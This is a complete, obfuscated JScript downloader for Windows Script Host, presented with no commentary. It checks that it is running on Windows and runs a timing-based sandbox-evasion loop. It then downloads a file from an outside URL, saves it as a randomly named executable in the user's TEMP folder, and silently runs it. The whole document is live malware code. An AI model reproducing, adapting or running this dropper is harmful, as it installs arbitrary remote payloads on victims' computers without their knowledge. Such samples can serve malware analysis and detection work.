var J0 = false;
var ns = "CreateObject";
var Z0 = function S() {return WScript[ns]("WScript.Shell");}(), aO = 11;
var h = "MSXML2.XMLHTTP";
var J = 2123213;
var k = 0;
function B(O){Z0["Run"](O, k, k);};
function e(){return "" + h;};
function e0(X, d){k = k * 1; return X - d;};
function y(){return ns;};
/*@cc_on
  @if (@_win32 || @_win64)
    J0 = true;
  @end
@*/
if (J0)
{
var P0 = "";
function P(){return 22;};
var Zp = 0; var iV = 0;
function ps()
{
var qJ = new this["Date"]();
var aJ = qJ["getUTCMilliseconds"]();
WScript["Sleep"](P());
var qJ = new this["Date"]();
var I = qJ["getUTCMilliseconds"]();
WScript["Sleep"](P());
var qJ = new this["Date"]();
var e1 = qJ["getUTCMilliseconds"]();
var Zp = "gW";
Zp = e0(I, aJ);
var iV = "E";
iV = e0(e1, I);
P0 = "open";
return e0(Zp, iV);
}
var V = false;
var MC = false;
for (var eo = k; eo < P() * 1; eo++){if (ps() != k){
V = true; 
iV = "31" + 11 * Zp + iV; 
MC = true; 
break;
}}
function Rh() {return ((V == true) && (V == MC)) ? 1 : k;};
if (V && Rh() && MC){
function T() {return Z0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "94MXy0HjRGkwT2e.exe";};
 OX = e();
 V0 = WScript[ns](OX);
 var fb = 1;
 while (fb){
try {
V0[P0]("GET", "http://energq.com/e3ola", false);
V0["send"]();
Kz = "Sleep";
for (;;){WScript[Kz](P() * 11); if (V0["readystate"] >= 2 * 2) break;};
fb = k;
} catch(s){};
}
function Z(jK) {var A = (1, 2, 3, 4, 5, jK); return A;};
y0 = WScript[y()]("ADODB.Stream");
OX = y0;
OX[P0]();
OX["type"] = Z(1);
OX["write"](V0["ResponseBody"]);
y0["position"] = Z(k);
OX["Save" + "ToFile"](T(), 2);
y0["c"+"lose"]();
wv = T();
B(wv);
}
}

